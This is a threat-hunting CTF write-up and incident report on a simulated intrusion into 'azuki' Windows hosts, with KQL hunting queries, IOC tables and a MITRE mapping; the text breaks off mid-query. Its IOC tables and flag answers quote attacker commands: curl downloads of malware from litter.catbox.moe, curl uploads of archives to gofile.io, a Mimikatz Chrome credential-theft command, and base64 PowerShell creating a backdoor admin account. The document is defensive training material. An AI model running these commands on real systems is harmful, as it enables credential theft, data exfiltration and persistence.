To see my threat hunting methodology, please jump ahead to [Appendix C: CTF Investigation]()
## Table of Contents
1. [Incident Overview](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#incident-overview)
2. [Root Cause Analysis](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#root-cause-analysis)
3. [Threat Actor Timeline](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#threat-actor-timeline)
4. [Security Recommendations](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#security-recommendations)
	1. Immediate Response
	2. Containment
5. [Business Impact](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#business-impact)
	1. Shareholders
	2. Business Partners
	3. Employees
	4. Customers
6. [Appendix A: Indicators of Compromise (IOCs)](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#appendix-a-indicators-of-compromise-iocs)
7. [Appendix B: MITRE ATT&CK Mapping](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#appendix-b-mitre-attck-mapping)
8. [Appendix C: CTF Investigation](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#appendix-c-ctf-investigation)
9. [Appendix D: CTF Flags](https://github.com/fyceu/Bridge-Takeover/blob/main/Investigation%20Report.md#appendix-d-ctf-flags)

---
## Incident Overview
Incident ID: INC0003-2025-1124 <br>
Severity: **CRITICAL** <br>
Status: Ongoing <br>
Analyst Assigned: `Fasi Sika`

## Root Cause Analysis
The root cause of this incident stemmed from the continued use of compromised credentials of `kenji.sato` alongside the previous exfiltration of the IT Administrator credential spreadsheet. Credentials of administrator `yuki.tanaka` contained within this spreadsheet allowed the actor to pivot directly to a privileged  account and endpoint. 

## Threat Actor Timeline

### Initial Access 
Timestamp: `2025-11-25T04:00:40.9639268Z` <br>
Threat actor (`149[.]50[.]209[.]165`) used compromised credentials of `kenji.sato` to remote into `azuki-sl`

### Lateral Movement
Timestamp:  `2025-11-25T04:06:52.7572947Z` <br>
Threat actor used compromised admin credentials from `IT-Admin-Passwords.csv` spreadsheet to pivot laterally from `azuki-sl` to `azuki-adminpc`

### Discovery
Timestamp: `2025-11-25T04:08:49.250Z` <br>
After establishing access to `azuki-adminpc`, the threat actor executed a sequence of utilities to enumerate host, session, domain trusts, and network states
- `whoami.exe /all` — account privileges and group membership 
- `qwinsta.exe`, `query.exe user`, `quser.exe` — active terminal sessions 
- `nltest.exe /domain_trusts /all_trusts` — domain trust relationships (executed twice) 
- `cmdkey.exe /list` — stored credentials enumeration 
- `NETSTAT.EXE -ano` — active network connections 
- `cmd.exe /c where /r C:\Users *.kdbx` — KeePass database file search

### Credential Access
Timestamp: `2025-11-25T04:15:52.4440000Z` <br>
The threat actor located and opened a plaintext credential file using Notepad, which created a Windows shortcut artifact at 

`C:\Users\yuki.tanaka\AppData\Roaming\Microsoft\Windows\Recent\OLD-Passwords.lnk`

### Command and Control
Timestamp: `2025-11-25T04:21:13.0441744Z` <br>
The threat actor abused `curl.exe` to download a password-protected 7z archive into a self-created subdirectory under a legitimate Windows path. The filename `KB5044273-x64.7z` masquerades as a Windows Update package.

### Execution
Timestamp: `2025-11-25T04:21:32.2579357Z` <br>
The downloaded archive was extracted yielded three binaries:
- `m.exe` — confirmed Mimikatz via SHA256 hash lookup
- `meterpreter.exe` — Metasploit C2 implant
- `silentlynx.exe` — unknown binary (no VirusTotal hits at time of analysis)

### Command and Control 
Timestamp: `2025-11-25T04:24:34.3155634Z - 2025-11-25T04:24:35.3398583Z` <br> 
The threat actor executed `meterpreter.exe`, which created named pipe `\Device\NamedPipe\msf-pipe-5902` consistent with the Metasploit framework.

### Collection
Timestamp: `2025-11-25T04:37:03.0075513Z - 2025-11-25T04:39:16.4900877Z` <br>
The threat actor created a staging directory at `C:\ProgramData\Microsoft\Crypto\staging\` and used `Robocopy.exe` to recursively copy sensitive data from the user's Documents folder into purpose-built subdirectories:

Staged data was compressed into seven archives:
- `credentials.tar.gz`
- `quickbooks-data.tar.gz`
- `banking-records.tar.gz`
- `tax-documents.tar.gz`
- `contracts-data.tar.gz`
- `chrome-credentials.tar.gz`
- `Tax-Supporting-Docs-2024.zip`

### Exfiltration
Timestamp: `2025-11-25T04:41:51.7723427Z` <br>
Archived data was exfiltrated using `curl.exe` HTTP POST requests to an anonymous file-sharing service. Each archive was uploaded individually using the same pattern.

### Persistence 
Timestamp: `2025-11-25T04:51:08.9068069Z` <br> 
The threat actor executed a base64-encoded PowerShell command to create a backdoor account

### Privilege Escalation
Timestamp: `2025-11-25T04:51:23.1513024Z` <br>
A second base64-encoded PowerShell command added the newly created backdoor account `yuki.tanaka2` to the local Administrators group.

### Command and Control 
Timestamp: `2025-11-25T05:55:34.5280119Z` <br> 
The threat actor downloaded a fresh copy of Mimikatz directly into the user's working directory from the same hosting service used earlier:

### Execution 
Timestamp: `2025-11-25T05:55:44.3810000Z` <br> 
The second archive was extracted to recover the Mimikatz binary

### Credential Access 
Timestamp: `2025-11-25T05:55:54.8585250Z` <br> 
The threat actor executed targeted Chrome browser credential theft using Mimikatz's DPAPI module against the local user's Chrome login data

## Security Recommendations
Given that the broader investigation remains active, the following are recommended actions to limit further attacker access and contain ongoing risk in the environment. These should be implemented immediately and revisited as additional findings are confirmed.

### Immediate Response
The following actions are recommended upon confirmation of unauthorized access on `azuki-sl` and `azuki-adminpc`:

- Forensic preservation of both endpoints, including memory captures and disk imaging, prior to any cleanup activity
- Forced termination of all active sessions for `kenji.sato`, `yuki.tanaka`, and the attacker-created `yuki.tanaka2` account
- Disablement of the `yuki.tanaka2` backdoor account pending forensic review and removal from the local Administrators group on `azuki-adminpc`
- Password reset for `kenji.sato` and `yuki.tanaka`, with MFA enforcement applied at reset
- Notification of security leadership and initiation of formal incident tracking
- Identification and tagging of all data exfiltrated to `gofile.io` for impact assessment, including the contents of `Azuki-Passwords.kdbx` and `KeePass-Master-Password.txt`

### Containment
The following containment measures are recommended to prevent further attacker activity while the investigation continues:

- Network isolation of `azuki-sl` and `azuki-adminpc` from the internal environment
- Addition of the following indicators to perimeter blocklists:
    - External IP `149.50.209.165` (re-entry source)
    - Domain `litter.catbox.moe` (malware staging host)
    - Domain `gofile.io` and resolved IP `45.112.123.227` (exfiltration destination)
- Outbound filtering to restrict outbound HTTP/HTTPS traffic to known anonymous file-sharing services
- Organization-wide rotation of all credentials contained in `IT-Admin-Passwords.csv`, given that this file enabled the lateral movement observed in this investigation
- Full credential rotation for every account stored in the compromised KeePass vault (`Azuki-Passwords.kdbx`), as the master password file was exfiltrated alongside the database
- Temporary access restrictions on sensitive file shares containing banking, tax, and contract documentation pending review of additional access pathways
- Continuous monitoring of `azuki-sl` and `azuki-adminpc` for any indicators of re-entry or follow-on activity from the threat actor

## Business Impact
### Shareholders
The exfiltration of banking records, tax documentation, QuickBooks, accounting data, and signed contracts represents a risk to organizational financial integrity. The loss of the KeePass database and the its master password compromises every credential the organization had stored. This expands the attack surface exponentially. Combined with this being the third successful intrusion in a six-day window, shareholders should expect remediation costs, increased insurance scrutiny, and possible regulatory disclosure obligations.

### Business Partners
Stolen contact documentation may contain confidential items, pricing structures, and partner specific operational details. Affected partners will be notified within 48 hours in accordance with breach notification commitments. Continuous dark-web monitoring has been initiated to identify any leaks or stolen information for sale. 

### Employees
The compromise extended to administrative accounts and resulted in the theft of Chrome browser credentials, plaintext passwords and the organizational KeePass vault. ALL employees are required to rotate credentials even if they are not in the password database. 

### Customers
No direct customer facing systems were compromised. However, the exfiltrated tax records, banking information, and contract data introduces an indirect risk to customers if paired alongside other publicly available or previously compromised data. 

## Appendix A: Indicators of Compromise (IOCs)

|    **Type**    |                                                **Indicator**                                                |                                **Context**                                |
| :------------: | :---------------------------------------------------------------------------------------------------------: | :-----------------------------------------------------------------------: |
|   IP Address   |                                            `149[.]50[.]209[.]165`                                           |          External IP used for re-entry via compromised RDP credentials    |
|   IP Address   |                                            `45[.]112[.]123[.]227`                                           |          Resolved IP for `gofile.io` exfiltration endpoint                |
|   IP Address   |                                              `10[.]1[.]0[.]108`                                             |             Internal IP of `azuki-adminpc` (lateral movement target)      |
|   IP Address   |                                              `10[.]1[.]0[.]204`                                             |             Internal IP of `azuki-sl` (lateral movement source)           |
|   Host Name    |                                                  `azuki-sl`                                                 |             Workstation used for initial external access                  |
|   Host Name    |                                               `azuki-adminpc`                                               |          Privileged endpoint compromised via lateral movement             |
|  User Account  |                                                `kenji.sato`                                                 |       Compromised standard user account (re-used from prior incident)     |
|  User Account  |                                                `yuki.tanaka`                                                |   Privileged account compromised via stolen `IT-Admin-Passwords.csv`      |
|  User Account  |                                                `yuki.tanaka2`                                               |              Attacker-created backdoor administrator account              |
|     Domain     |                                              `litter.catbox.moe`                                            |           File-sharing service used to host malicious archives            |
|     Domain     |                                              `store1.gofile.io`                                             |               Exfiltration endpoint for staged archives                   |
|      URL       |                              `hxxps[://]litter[.]catbox[.]moe/gfdb9v[.]7z`                                  |    First malicious archive (Mimikatz, Meterpreter, SilentLynx)            |
|      URL       |                              `hxxps[://]litter[.]catbox[.]moe/mt97cj[.]7z`                                  |       Second malicious archive (Mimikatz for Chrome credential theft)     |
|   File Path    |                                          `C:\Windows\Temp\cache\`                                           |        Attacker-created subdirectory used as primary tool staging         |
|   File Path    |                                  `C:\ProgramData\Microsoft\Crypto\staging\`                                 |             Staging directory for collected data prior to exfiltration    |
|   File Path    |               `C:\Users\yuki.tanaka\AppData\Roaming\Microsoft\Windows\Recent\OLD-Passwords.lnk`             |       Shortcut artifact created from threat actor opening `OLD-Passwords.txt`        |
|      File      |                                            `KB5044273-x64.7z`                                               |        Initial malicious archive (masquerades as Windows Update)          |
|      File      |                                                `m-temp.7z`                                                  |             Second malicious archive containing Mimikatz                  |
|      File      |                                                  `m.exe`                                                    |              Renamed Mimikatz binary used for credential theft            |
|      File      |                                              `meterpreter.exe`                                              |                  Metasploit C2 implant                                    |
|      File      |                                              `silentlynx.exe`                                               |   Unknown binary extracted alongside known offensive tools (no VT hits)   |
|      File      |                                            `Azuki-Passwords.kdbx`                                           |                  KeePass database exfiltrated                             |
|      File      |                                        `KeePass-Master-Password.txt`                                        |        Plaintext file containing master password for KeePass vault        |
|      File      |        `credentials.tar.gz`, `quickbooks-data.tar.gz`, `banking-records.tar.gz`, `tax-documents.tar.gz`,    |                                                                           |
|                |   `contracts-data.tar.gz`, `chrome-credentials.tar.gz`, `Tax-Supporting-Docs-2024.zip`                      |                Archives staged for and used in exfiltration               |
|  Named Pipe    |                                     `\Device\NamedPipe\msf-pipe-5902`                                       |              Metasploit Meterpreter session named pipe                    |
|    Command     |                            `"cmdkey.exe" /add:10.1.0.108 /user:yuki.tanaka /pass:********`                  |          Stored stolen admin credentials for RDP pivot                    |
|    Command     |              `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`  |                  Initial malware archive download                         |
|    Command     |                                  `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`           |                  Second malware archive download                          |
|    Command     |     `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y`              |                Password-protected archive extraction                      |
|    Command     |                       `"curl.exe" -X POST -F file=@<archive> https://store1.gofile.io/uploadFile`           |             Repeated pattern for archive exfiltration                     |
|    Command     |  `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit` |     Chrome DPAPI credential theft via Mimikatz                |
|    Command     |                              `net user yuki.tanaka2 B@ckd00r2024! /add` (base64-encoded)                    |          Backdoor account creation                                        |
|    Command     |                       `net localgroup Administrators yuki.tanaka2 /add` (base64-encoded)                    |          Backdoor account privilege escalation                            |

## Appendix B: MITRE ATT&CK Mapping

|       Time (UTC)             |                                          Activity                                                          |        Tactic         |       Technique                              | Technique ID |
| :--------------------------: | :--------------------------------------------------------------------------------------------------------: | :-------------------: | :------------------------------------------: | :----------: |
| 2025-11-25T04:00:40           | External IP `149.50.209.165` authenticated via RemoteInteractive logon as `kenji.sato`                     | Initial Access        | Valid Accounts                               | T1078        |
| 2025-11-25T04:00:40           | Remote Desktop Protocol session established to `azuki-sl`                                                  | Initial Access        | External Remote Services                     | T1133        |
| 2025-11-25T04:06:52           | Pivoted from `azuki-sl` to `azuki-adminpc` via `mstsc.exe` using stolen `yuki.tanaka` credentials          | Lateral Movement      | Remote Services: Remote Desktop Protocol     | T1021.001    |
| 2025-11-25T04:08:49           | `whoami.exe /all` — account and privilege enumeration                                                      | Discovery             | System Owner/User Discovery                  | T1033        |
| 2025-11-25T04:08:58           | `qwinsta.exe`, `query.exe user`, `quser.exe` — terminal session enumeration                                | Discovery             | System Owner/User Discovery                  | T1033        |
| 2025-11-25T04:09:25           | `nltest.exe /domain_trusts /all_trusts` (executed twice)                                                   | Discovery             | Domain Trust Discovery                       | T1482        |
| 2025-11-25T04:09:46           | `cmdkey.exe /list` — Windows Credential Manager enumeration                                                | Credential Access     | Credentials from Password Stores: Windows Credential Manager | T1555.004    |
| 2025-11-25T04:10:07           | `NETSTAT.EXE -ano` — network connection enumeration                                                        | Discovery             | System Network Connections Discovery         | T1049        |
| 2025-11-25T04:13:45           | `cmd.exe /c where /r C:\Users *.kdbx` — KeePass database file search                                       | Discovery             | File and Directory Discovery                 | T1083        |
| 2025-11-25T04:15:52           | Plaintext credential file `OLD-Passwords.txt` opened via Notepad                                           | Credential Access     | Unsecured Credentials: Credentials In Files  | T1552.001    |
| 2025-11-25T04:21:13           | `KB5044273-x64.7z` downloaded from `litter.catbox.moe` via `curl.exe`                                      | Command and Control   | Ingress Tool Transfer                        | T1105        |
| 2025-11-25T04:21:13           | Archive named to masquerade as Windows Update package                                                      | Defense Evasion       | Masquerading: Match Legitimate Resource Name or Location | T1036.005    |
| 2025-11-25T04:21:32           | Password-protected `7z.exe x` extraction of malicious archive                                              | Defense Evasion       | Deobfuscate/Decode Files or Information      | T1140        |
| 2025-11-25T04:24:34           | `meterpreter.exe` executed (Metasploit C2 implant)                                                         | Command and Control   | Application Layer Protocol                   | T1071        |
| 2025-11-25T04:24:35           | Named pipe `\Device\NamedPipe\msf-pipe-5902` created                                                       | Execution             | Inter-Process Communication                  | T1559        |
| 2025-11-25T04:37:03           | `Robocopy.exe` recursively staging Banking, Tax, QuickBooks, and contract data                             | Collection            | Data from Local System                       | T1005        |
| 2025-11-25T04:37:33           | Tar/Zip archives created within staging directory                                                          | Collection            | Archive Collected Data: Archive via Utility  | T1560.001    |
| 2025-11-25T04:39:16           | `Azuki-Passwords.kdbx` and `KeePass-Master-Password.txt` collected into credential archive                 | Credential Access     | Unsecured Credentials: Credentials In Files  | T1552.001    |
| 2025-11-25T04:41:51           | Archives exfiltrated via `curl.exe` HTTP POST to `gofile.io`                                               | Exfiltration          | Exfiltration Over Web Service: Exfiltration to Cloud Storage | T1567.002    |
| 2025-11-25T04:51:08           | Base64-encoded PowerShell execution of `net user yuki.tanaka2 B@ckd00r2024! /add`                          | Persistence           | Create Account: Local Account                | T1136.001    |
| 2025-11-25T04:51:08           | PowerShell command obfuscated with `-EncodedCommand` base64 payload                                        | Defense Evasion       | Obfuscated Files or Information: Command Obfuscation | T1027.010    |
| 2025-11-25T04:51:23           | `net localgroup Administrators yuki.tanaka2 /add` — backdoor account added to Administrators group         | Privilege Escalation  | Account Manipulation: Additional Local or Domain Groups | T1098.007    |
| 2025-11-25T05:55:34           | Second Mimikatz archive `m-temp.7z` downloaded via `curl.exe`                                              | Command and Control   | Ingress Tool Transfer                        | T1105        |
| 2025-11-25T05:55:54           | Mimikatz `dpapi::chrome` executed against Chrome login data                                                | Credential Access     | Credentials from Password Stores: Credentials from Web Browsers | T1555.003    |

## Appendix C: CTF Investigation

### 🚩 FLAG 1: LATERAL MOVEMENT - Source System
> Attackers pivot from initially compromised systems to high-value targets. Identifying the source of lateral movement reveals the attack's progression and helps scope the full compromise.

From previous investigations, we know that the threat actor has compromised a couple user accounts and endpoints within our internal environment. From their most recent attack, they were able to exfiltrate a spreadsheet of IT Administrator credentials. To check for any Remote logons, I searched through `DeviceLogonEvents` using the following query: 

```KQL
DeviceLogonEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime("11-24-2025")
| where LogonType == "RemoteInteractive"
| project Timestamp, DeviceName, AccountName, ActionType, LogonType, RemoteDeviceName, RemoteIP, RemotePort
| sort by Timestamp asc
```

From the query, I found an external IP address, `149.50.209.165`, remoting into `azuki-sl` on the compromised account `kenji.sato`. Six minutes later,  there was a successful login to `azuki-adminpc` from the IP address of `azuki-sl` (`10.1.0.204`)

Based on this information, credentials of `yuki.tanaka` were most likely in the IT Administrator spreadsheet. 

**Question**: Identify the source IP address for lateral movement to the admin PC?
Flag: `10.1.0.204`
Timestamp: `2025-11-25T04:06:52.7572947Z`

---
### 🚩 FLAG 2: LATERAL MOVEMENT - Compromised Credentials
> Understanding which accounts attackers use for lateral movement determines the blast radius and guides credential reset priorities.

**Question**: Identify the compromised account used for lateral movement?
Flag: `yuki.tanaka`
Timestamp: `2025-11-25T04:06:52.7572947Z`

---
### 🚩 FLAG 3: LATERAL MOVEMENT - Target Device
> Attackers select high-value targets based on user roles and data access. Identifying the compromised device reveals what information was at risk.

**Question**: What is the target device name?
Flag: `azuki-adminpc`
Timestamp: `2025-11-25T04:06:52.7572947Z`

----
### 🚩 FLAG 4: EXECUTION - Payload Hosting Service
> Attackers rotate infrastructure between operations to evade network blocks and threat intelligence feeds. Documenting new domains is critical for prevention.

Based on previous attack behavior, the attacker downloads their malware from an online hosting service. I checked for any commands that accessed http: 
```KQL
DeviceFileEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime("2025-11-24")
| where InitiatingProcessCommandLine contains "http"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FileSize, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```

As expected, the attacker was able to download a 7z archive from an unfamiliar host site running the following command. 

`"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`
- `curl.exe -L` command line utility to send HTTP request
- `-o C:\Windows\Temp\cache\KB5044273-x64.7z` output directory and file downloaded
- `https://litter.catbox.moe/gfdb9v.7z` site hosting malicious file

I should keep note of this directory `C:\Windows\Temp\cache`, as cache is a user created directory hiding in a legitimate Windows temp location. The threat actor could use this directory in the future to stage their attack. 

Grabbing the SHA256 hash of this archive and chucking it into VirusTotal does not return any results, but that does not clear it of any malicious intent.

SHA256: `c8ff861a52e85c9bfa2735f16c9f428c9de446e7295f2c5d3e6c194a4d322fb2`
**INSERT IMAGE HERE**

However, searching the host site returns hits
- check URL in security browsing tool or whoislookup for more info
- need to prove that this is not a legitimate site or can be blockd in security recommendations
**INSERT IMAGE HERE**

**Question**: What file hosting service was used to stage malware?
Flag: `litter.catbox.moe`
Timestamp: `2025-11-25T04:21:13.0441744Z`

---
### **🚩** FLAG 5: EXECUTION - Malware Download Command
> Command-line download utilities provide flexible, scriptable malware delivery while blending with legitimate administrative activity.

**Question**: What command was used to download the malicious archive?
Flag: `"curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z`
Timestamp: `2025-11-25T04:21:13.0441744Z`

---
### **🚩** FLAG 6: EXECUTION - Archive Extraction Command
> Password-protected archives evade basic content inspection while legitimate compression tools bypass application whitelisting controls.

Although the 7z archive was not flagged as malicious by VirusTotal, it may have malicious contents. Let's check if the attacker extracted the contents:
```KQL 
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime("2025-11-24")
| where ProcessCommandLine contains ".7z"
| project Timestamp, DeviceName, AccountName, ActionType, FileName, ProcessCommandLine, ProcessVersionInfoOriginalFileName
| sort by Timestamp asc
```

The threat actor ran 7z to extract the contents using the following command: 
`"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -o C:\Windows\Temp\cache\ -y`
- `7z.exe` archive extracting utility
- `x` maintains directory structure of archive
- `C:\Windows\Temp\cache\KB5044273-x64.7z` downloaded archive 
- `-p********` password of 7z archive
- `-o C:\Windows\Temp\cache\` output directory 
- `-y` auto overwrite any files in directory 

**Question**: Identify the command used to extract the password-protected archive?
Flag: `"7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -o C:\Windows\Temp\cache\ -y`
Timestamp: `2025-11-25T04:21:32.2579357Z`

--- 
### 🚩 FLAG 7: PERSISTENCE - C2 Implant
> Command and control implants maintain persistent access and enable remote control of compromised systems. The implant filename often mimics legitimate processes.

Next step would be to see what files were extracted to `C:\Windows\Temp\cache`: 
```KQL 
DeviceFileEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:21:32.2579357Z')
| where FolderPath contains @"C:\Windows\Temp\cache"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FileSize, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```

From the screenshot, it's certain the attacker was using this location as the main staging directory. 
Based on the timestamp and InitiatingProcessCommandLine, three different files were extracted from the archive: 
- `m.exe`
- `meterpreter.exe`
- `silentlynx.exe`

This does not look so good. 

From Incident #1 (Port of Entry), the threat actor was able to use `m.exe` (aka Mimikatz) to compile credentials from LSASS memory. Checking the SHA256 hash of `m.exe` confirms this binary to be a renamed Mimikatz. 

`meterpreter.exe` is a common Metasploit C2 attack payload. Running the following query shows that meterpreter was ran twice: 
```KQL
DeviceFileEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime("2025-11-24")
| where InitiatingProcessCommandLine contains "http"
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, FileName, FileSize, FolderPath, InitiatingProcessCommandLine, SHA256
| sort by Timestamp asc
```


`silentlynx.exe` is not familiar to me, but doing a google search returns the SilentLynx the APT that is common. Running the hash of this executable in VirusTotal doesn't return a hit, but I should be wary and see if this is ever executed. 

**INSERT SCREENSHOT HERE**

**Question:** Identify the C2 beacon filename?
Flag: `meterpreter.exe`
Timestamp: `2025-11-25T04:21:33.118662Z`

----
### 🚩 FLAG 8: PERSISTENCE - Named Pipe
> Named pipes enable inter-process communication for C2 frameworks. Pipes follow distinctive naming patterns that serve as behavioral indicators.

```KQL
DeviceEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:21:33.118662Z')
| where ActionType == "NamedPipeEvent"
| where InitiatingProcessFileName == "meterpreter.exe"
| extend parsedJson = parse_json(AdditionalFields)
| project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, PipeName = parsedJson.PipeName, SHA256
| sort by Timestamp asc
```

Timestamp: `2025-11-25T04:24:35.3398583Z`
PipeName: `\Device\NamedPipe\msf-pipe-5902`

Timestamp: `2025-11-25T05:36:54.8450628Z`
PipeName: `\Device\NamedPipe\msf-pipe-5722`

**Question**: Identify the named pipe created by the C2 implant?
Flag: `\Device\NamedPipe\msf-pipe-5902`
Timestamp: `2025-11-25T04:24:35.3398583Z`

---
### **🚩** FLAG 9: CREDENTIAL ACCESS - Decoded Account Creation
> Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

Check to see if the attacker ran any powershell commands: 
```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:21:33.118662Z')
| where FileName == "powershell.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

Scrolling through the logs, I found two commands ran by the attacker that included the flag`-EncodedCommand`

Timestamp: `2025-11-25T04:51:08.9068069Z`
ProcessCommandLine: `"powershell.exe" -EncodedCommand bgBlAHQAIAB1AHMAZQByACAAeQB1AGsAaQAuAHQAYQBuAGEAawBhADIAIABCAEAAYwBrAGQAMAAwAHIAMgAwADIANAAhACAALwBhAGQAZAA=`

ProcessCommandLine: `"powershell.exe" -EncodedCommand bgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAAeQB1AGsAaQAuAHQAYQBuAGEAawBhADIAIAAvAGEAZABkAA==`

This looks like simple base64 encoded commnad. So I tossed these values into CyberChef to see what they were up to

**IMAGE ONE**
`net user yuki.tanaka2 B@ckd00r2024! /add`

**IMAGE TWO**
`net localgroup Administrators yuki.tanaka2 /add`

The attacker was able to create a backdoor account named `yuki.tanaka2.` By adding this new account to the administrators group provided them with elevated privileges in case they lose access to the current compromised accounts. 

**Question:** What is the decoded Base64 command?
Flag: `net user yuki.tanaka2 B@ckd00r2024! /add`
Timestamp: `2025-11-25T04:51:08.9068069Z`

---
### **🚩** FLAG 10: PERSISTENCE - Backdoor Account
> Hidden administrator accounts provide alternative access if primary persistence mechanisms are discovered and removed.

**Question:** Identify the backdoor account name?
Flag: `yuki.tanaka2`
Timestamp: `2025-11-25T04:51:08.9068069Z`

----
### 🚩 FLAG 11: PERSISTENCE - Decoded Privilege Escalation Command
> Base64 encoding obfuscates malicious commands from basic string matching and log analysis. Decoding reveals the true intent.

```KQL 
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:21:33.118662Z')
| where ProcessCommandLine contains "-EncodedCommand"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

**Question**: What is the decoded Base64 command for privilege escalation?
Flag: `net localgroup Administrators yuki.tanaka2 /add`
Timestamp: `2025-11-25T04:51:23.1513024Z`

---
### **🚩** FLAG 12: DISCOVERY - Session Enumeration
> Terminal services enumeration reveals active user sessions, helping attackers identify high-value targets and avoid detection.

I am not sure how to enumerate RDP sessions on windows, but doing a [quick google search](https://www.google.com/search?q=how+to+enumerate+rdp+session+windows&sca_esv=a6b2f659cc70f54c&sxsrf=ANbL-n5apeXPj1vmUTg9Kwt9k6JKtNQIHQ%3A1770424467792&source=hp&ei=k4iGafuaLoOv5NoP2o3U4AE&iflsig=AFdpzrgAAAAAaYaWo25qs7vBmUP6PupuWuQ_JNiC3BCS&ved=0ahUKEwi7sIKMkcaSAxWDF1kFHdoGFRwQ4dUDCDQ&uact=5&oq=how+to+enumerate+rdp+session+windows&gs_lp=Egdnd3Mtd2l6IiRob3cgdG8gZW51bWVyYXRlIHJkcCBzZXNzaW9uIHdpbmRvd3MyBRAhGKABMgUQIRigATIFECEYoAEyBRAhGKABMgUQIRigATIFECEYqwIyBRAhGKsCMgUQIRifBTIFECEYnwVI7TlQAFidOXAKeACQAQCYAZ8CoAGUMqoBBjguMjkuNbgBA8gBAPgBAZgCNKACrzPCAg4QLhiABBixAxjRAxjHAcICCxAuGIAEGLEDGIMBwgILEC4YgAQY0QMYxwHCAggQABiABBixA8ICCxAAGIAEGLEDGIMBwgIOEC4YgAQYsQMYgwEYigXCAgUQABiABMICBRAuGIAEwgIOEAAYgAQYsQMYgwEYigXCAggQLhiABBixA8ICBxAAGIAEGArCAgkQABiABBgKGAvCAgYQABgWGB7CAgkQABgWGMcDGB7CAggQABiABBiiBMICBRAAGO8FwgIIEAAYogQYiQXCAgcQIRigARgKmAMAkgcHMTguMjguNqAHkeMCsgcGOC4yOC42uAeRM8IHBjYuNDQuMsgHW4AIAA&sclient=gws-wiz) shows that command line utilities like `qwinsta` or `Get-RDUserSession` gets the job done: 
```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine has_any ("qwinsta", "Get-RDUserSession")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

And just like that. The attacker used `qwinsta` to view active sessions. 

**Question**: What command was used to enumerate RDP sessions?
Flag: `qwinsta`
Timestamp: `2025-11-25T04:08:58.5854766Z`

---
### **🚩** FLAG 13: DISCOVERY - Domain Trust Enumeration
> Domain trust relationships reveal paths for lateral movement across organisational boundaries and potential targets in connected forests.

```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine contains "Nltest"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by Timestamp asc
```

**Question:** Identify the command used to enumerate domain trusts?
Flag: `"nltest.exe" /domain_trusts /all_trusts`
Timestamp: `2025-11-25T04:09:25.4429368Z

---
### **🚩** FLAG 14: DISCOVERY - Network Connection Enumeration
> Network connection enumeration identifies active sessions, listening services, and potential lateral movement targets.

```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine has_any ("net", "netstat")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| sort by Timestamp asc
```

**Question:** What command was used to enumerate network connections?
Flag: `"NETSTAT.EXE" -ano`
Timestamp: `2025-11-25T04:10:07.805432Z

---
### **🚩** FLAG 15: DISCOVERY - Password Database Search
> Password management databases contain credentials for multiple systems, making them high-priority targets for credential theft.

```KQL
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where ProcessCommandLine contains @"C:\Users"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp asc
```

**Question**: What command was used to search for password databases?
Flag: `"cmd.exe" /c where /r C:\Users *.kdbx`
Timestamp: `2025-11-25T04:13:45.8171756Z

---
### **🚩** FLAG 16: DISCOVERY - Credential File
> Plaintext password files represent critical security failures and provide attackers with immediate access to multiple systems.


```KQL
DeviceFileEvents
| where DeviceName contains "azuki"
| where Timestamp > todatetime('2025-11-25T04:06:52.7572947Z')
| where FileName has_any (".lnk", ".txt")
